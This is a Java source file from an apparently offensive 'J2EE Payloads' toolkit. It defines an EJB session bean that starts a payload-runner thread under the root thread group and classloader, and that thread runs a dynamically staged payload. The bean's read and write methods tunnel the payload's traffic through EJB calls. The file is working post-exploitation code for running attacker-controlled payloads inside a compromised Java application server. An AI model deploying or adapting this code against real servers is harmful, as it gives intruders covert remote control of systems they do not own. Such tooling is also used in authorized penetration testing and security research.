/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.ejb;

import j2eepayload.dynstager.DynstagerSupport;
import javapayload.handler.stager.WrappedPipedOutputStream;
import java.io.*;

public abstract class JavaPayloadTunnelBean implements javax.ejb.SessionBean {

	private static final PipedInputStream[] referenceStreams = new PipedInputStream[32];
	
	private OutputStream tunnelOut;
	private PipedInputStream tunnelIn;

	public void ejbCreate(final String[] parameters) throws Exception {
		final PipedInputStream in = new PipedInputStream();
		tunnelOut = new WrappedPipedOutputStream(new PipedOutputStream(in));
		tunnelIn = new PipedInputStream();
		final OutputStream out = new WrappedPipedOutputStream(new PipedOutputStream(tunnelIn));
		ThreadGroup tg = Thread.currentThread().getThreadGroup();
		while (tg.getParent() != null)
			tg = tg.getParent();
		PayloadRunner runner = new PayloadRunner(tg, in, out, parameters);
		ClassLoader cl = runner.getContextClassLoader();
		while (cl.getParent() != null)
			cl = cl.getParent();
		runner.setContextClassLoader(cl);
		runner.start();
		runner.join(1000);
		Exception ex = runner.getException();
		if (ex != null) {
			throw ex;
		}
	}

	public synchronized void ejbCreate(int inputStreamReference) {
		tunnelIn = referenceStreams[inputStreamReference];
		referenceStreams[inputStreamReference] = null;
		if (tunnelIn == null) 
			throw new IllegalArgumentException("Invalid stream reference");
	}

	public synchronized int separateInputToReference() {
		if (tunnelIn == null)
			throw new IllegalStateException("Input already separated");
		for (int i = 0; i < referenceStreams.length; i++) {
			if (referenceStreams[i] == null) {
				referenceStreams[i] = tunnelIn;
				tunnelIn = null;
				return i;
			}
		}
		throw new IllegalStateException("No free reference slots");
	}
	
	public byte[] read(int length) throws IOException {
		byte[] temp = new byte[length];
		int len = tunnelIn.read(temp, 0, length);
		if (len == -1) return null;
		byte[] result = new byte[len];
		System.arraycopy(temp, 0, result, 0, len);
		return result;
	}
	
	public int available() throws IOException {
		return tunnelIn.available();
	}
	
	public void write(byte[] buffer, int off, int len) throws IOException {
		tunnelOut.write(buffer, off, len);
	}
	
	public void flush() throws IOException {
		tunnelOut.flush();
	}
	
	public void closeIn() throws IOException {
		tunnelIn.close();
	}

	public void closeOut() throws IOException {
		tunnelOut.close();
	}
	
	public static class PayloadRunner extends Thread {
		private final PipedInputStream in;
		private final OutputStream out;
		private final String[] parameters;
		private volatile Exception exception;

		private PayloadRunner(ThreadGroup tg, PipedInputStream in, OutputStream out, String[] parameters) {
			super(tg, (Runnable)null);
			this.in = in;
			this.out = out;
			this.parameters = parameters;
		}

		public void run() {
			try {
				DynstagerSupport.run(in, out, parameters);
			} catch (Exception ex) {
				exception = ex;
			}
		}
		
		public Exception getException() {
			return exception;
		}
	}
}
